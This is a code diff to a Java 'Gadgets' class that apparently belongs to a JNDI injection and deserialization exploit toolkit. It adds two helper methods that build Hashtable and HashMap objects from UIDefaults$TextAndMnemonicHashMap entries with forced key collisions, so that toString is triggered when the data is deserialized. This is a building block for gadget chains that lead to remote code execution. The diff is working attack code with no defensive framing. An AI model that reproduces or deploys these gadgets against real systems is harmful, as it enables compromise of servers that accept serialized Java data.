@@ -14,6 +14,7 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.Base64;
 import java.util.HashMap;
+import java.util.Hashtable;
 import java.util.Map;
 
 import static com.qi4l.jndi.gadgets.Config.Config.*;
@@ -300,5 +301,41 @@ public class Gadgets extends ClassLoader {
 
     public Class<?> defineClass(String name, byte[] bytecode) {
         return defineClass(name, bytecode, 0, bytecode.length);
+    }
+    public static Hashtable makeTableTstring(Object o) throws Exception{
+        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        tHashMap1.put(o,"Unam4");
+        tHashMap2.put(o,"SpringKill");
+        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
+        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(tHashMap1,"Unam4");
+        hashtable.put(tHashMap2,"SpringKill");
+
+        tHashMap1.put(o, null);
+        tHashMap2.put(o, null);
+        return hashtable;
+    }
+    public static HashMap maskmapToString(Object o1, Object o2) throws Exception{
+        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
+        tHashMap1.put(o1,null);
+        tHashMap2.put(o2,null);
+        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
+        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
+        HashMap hashMap = new HashMap();
+        Class node = Class.forName("java.util.HashMap$Node");
+        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
+        constructor.setAccessible(true);
+        Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
+        Object node2 = constructor.newInstance(0, tHashMap2, "SpringKill", null);
+        Reflections.setFieldValue(hashMap, "size", 2);
+        Object arr = Array.newInstance(node, 2);
+        Array.set(arr, 0, node1);
+        Array.set(arr, 1, node2);
+        Reflections.setFieldValue(hashMap, "table", arr);
+        return hashMap;
     }
 }
